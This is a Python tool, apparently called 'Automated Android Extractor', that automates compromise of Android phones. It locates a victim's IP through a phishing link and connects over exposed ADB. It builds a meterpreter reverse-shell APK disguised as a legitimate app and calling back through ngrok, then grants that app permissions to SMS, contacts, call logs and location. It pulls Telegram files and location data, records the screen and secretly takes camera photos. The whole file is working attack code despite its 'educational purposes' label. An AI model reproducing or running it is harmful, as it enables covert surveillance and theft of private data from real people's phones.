import os
import re
import subprocess
import pyautogui
import time
import threading
from pystyle import *

debug = 0
ip = ""
rooted = 0
state = ""

def phish():
    global ip
    url = input("Enter your phishing URL here: ")
    phishcmd = "curl -sk " + url + " |  grep ip-address | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}'"
    if debug == 1:
        print("="*50)
        print(phishcmd)
        print("="*50)
    os.system(phishcmd)
    ip = subprocess.check_output(phishcmd, shell = True).decode('UTF-8').strip()
    os.system("mkdir Artifact-" + ip)
    f = open(f"Artifact-{ip}/ip.txt", "w")
    f.write(ip)
    f.close()

def nmap():
    f = open(f"Artifact-{ip}/ip.txt", "r+")
    ipaddr = f.readline().strip()
    nmapcmd = "nmap -Pn " + ipaddr + " -p 5555 | grep -Eo 'open|closed|filtered'"
    if debug == 1:
        print("="*50)
        print(nmapcmd)
        print("="*50)
    os.system(nmapcmd)
    state = subprocess.check_output(nmapcmd, shell = True).decode('UTF-8').strip()
    f.write(" " + state + "\n")
    f.close()

def connectADB():
    global state
    f = open(f"Artifact-{ip}/ip.txt", "r")
    _, state = f.readline().strip().split()
    if state == "open":
        os.system("adb connect " + ip)
        print("[+] Connected to " + ip)

def startNGROK():
    if (subprocess.check_output('ps -aux | grep -o ngrok | grep -v grep | wc -l', shell = True).decode('UTF-8').strip() == "2"):
        output = subprocess.check_output("pwd", shell = True).decode('UTF-8').strip()
        pyautogui.hotkey('ctrl', 'shift', 'n')
        time.sleep(2)
        pyautogui.write('cd ' + output)
        pyautogui.hotkey('enter')
        pyautogui.write('./ngrok tcp 2323')
        pyautogui.hotkey('enter')

def createAPK():
    choice = input("Do you want to create and APK [y/n]?")
    if choice[0] == "y":
        startNGROK()
        lhost = input("Please enter ngrok LHOST: ")
        lport = input("Please enter ngrok LPORT: ")
        apk = input("Please enter full path of legit APK to mask: ")
        output = input("Please enter full path of where you want to save malicious APK: ")
        os.system("msfvenom -x " + apk + " -a dalvik --platform android -p android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " -o " + output)
    else:
        pass

def sendAPK():
    apk = input("Enter your apk name that you just created: ")
    os.system("adb install " + apk)
    os.system("adb shell pm grant bay.flappybird android.permission.READ_CONTACTS")
    os.system("adb shell pm grant bay.flappybird android.permission.READ_CALL_LOG")
    os.system("adb shell pm grant bay.flappybird android.permission.READ_SMS")
    os.system("adb shell pm grant bay.flappybird android.permission.ACCESS_FINE_LOCATION")

def dumpLocation():
    os.system("adb shell dumpsys location > Artifact-" + ip + "/dumpsys.txt")
    f = open(f"Artifact-{ip}/dumpsys.txt", "r")
    l = open(f"Artifact-{ip}/location.txt", "w")
    try:
        location = re.search(r'fused (.*?)hAcc', f.read()).group(1)
        l.write(location)
    except AttributeError:
        l.write("Location service is not on")
    f.close()
    l.close()

def teleDump():
    os.system("adb pull /sdcard/Telegram/ Artifact-" + ip)

def imagePull():
    os.system("adb shell am start -a android.media.action.STILL_IMAGE_CAMERA --ei android.intent.extras.CAMERA_FACING 1")
    time.sleep(0.5)
    os.system("adb shell input keyevent 27")
    os.system("adb pull /sdcard/DCIM/Camera Artifact-" + ip)

def startMSF():
    output = subprocess.check_output("pwd", shell = True).decode('UTF-8').strip()
    pyautogui.hotkey('ctrl', 'shift', 'n')
    time.sleep(2)
    pyautogui.write('cd ' + output + '/Artifact-' + ip)
    pyautogui.hotkey('enter')
    pyautogui.write('msfconsole -r ../msf.rc')
    pyautogui.hotkey('enter')

def screenRecord():
    os.system("adb shell screenrecord /sdcard/download/evidence.mp4")
    os.system("adb pull /sdcard/download/evidence.mp4 Artifact-" + ip + "/")

def checkRoot():
    global rooted
    output = subprocess.check_output("cat Artifact-" + ip + "/msfoutput.txt | grep -Eo 'rooted|not rooted'", shell = True).decode('UTF-8').strip()
    if output == "rooted":
        rooted = 1

if __name__ == '__main__':
    banner = '''
  (c).-.(c)         ****       ****       /**/////   (c).-.(c)
   / ._. \         **//**     **//**     /**          / ._. \ 
 __\( 0 )/__      **  //**   **  //**   /*******    __\( 0 )/__ 
(_.-/'-'\-._)    ********** ********** /**////     (_.-/'-'\-._)
   || 2 ||/     **//////**/**//////** /**             || 2 ||
 _.' `-' '._   /**     /**/**     /**/********      _.' `-' '._ 
(.-./`-'\.-.) //      // //      // ////////       (.-./`-'\.-.)
 `-'     `-'                                        `-'     `-'               
       ╔══════════════════════════════════════════════╗
       ║          Automated Android Extractor         ║
       ║      coded by IceBearWithoutIceSiewDai       ║
       ║        For Educational Purposes Only         ║
       ╚══════════════════════════════════════════════╝  
'''
    print(Colorate.Horizontal(Colors.rainbow, Center.XCenter(banner)))
    Write.Print("[+] Starting AAE", Colors.rainbow, interval=0.04)
    print("\n")
    try:
        userinput = input("Remote or local execution? [Remote/Local] ")
        if userinput == "Remote":
            phish()
            nmap()
            connectADB()
            if state == "open":
                createAPK()
                sendAPK()
                os.system("adb shell settings put secure location_mode 3")
                startMSF()
                time.sleep(20)
                while (subprocess.check_output('ps -aux | grep -o msfconsole | grep -v grep | wc -l', shell = True).decode('UTF-8').strip()== "3"):
                        time.sleep(1)
                checkRoot()
                if rooted == 1:
                    os.system("adb shell 'setprop ro.debuggable 1; setprop service.adb.tcp.port 5555; setprop ro.adb.secure 0;")
                t1 = threading.Thread(target=dumpLocation, args=())
                t2 = threading.Thread(target=teleDump, args=())
                t3 = threading.Thread(target=screenRecord, args=())
                t4 = threading.Thread(target=imagePull, args=())
                t1.start()
                t2.start()
                t3.start()
                t4.start()
                t1.join()
                t2.join()
                t3.join()
                t4.join()
            else:
                createAPK()
                startMSF()
        elif userinput == "Local":
            ip = input("Please enter Artifact name: ")
            os.system("mkdir Artifact-" + ip)
            t1 = threading.Thread(target=dumpLocation, args=())
            t2 = threading.Thread(target=teleDump, args=())
            t3 = threading.Thread(target=screenRecord, args=())
            t4 = threading.Thread(target=imagePull, args=())
            t1.start()
            t2.start()
            t3.start()
            t4.start()
            t1.join()
            t2.join()
            t3.join()
            t4.join()
        print("\n")
        os.system("adb disconnect")
        print("\n")
        Write.Print("[+] Stopping AAE", Colors.rainbow, interval=0.04)
        os._exit(0)
    except KeyboardInterrupt:
        print("\n")
        os.system("adb disconnect")
        print("\n")
        Write.Print("[+] Stopping AAE", Colors.rainbow, interval=0.04)
        os._exit(0)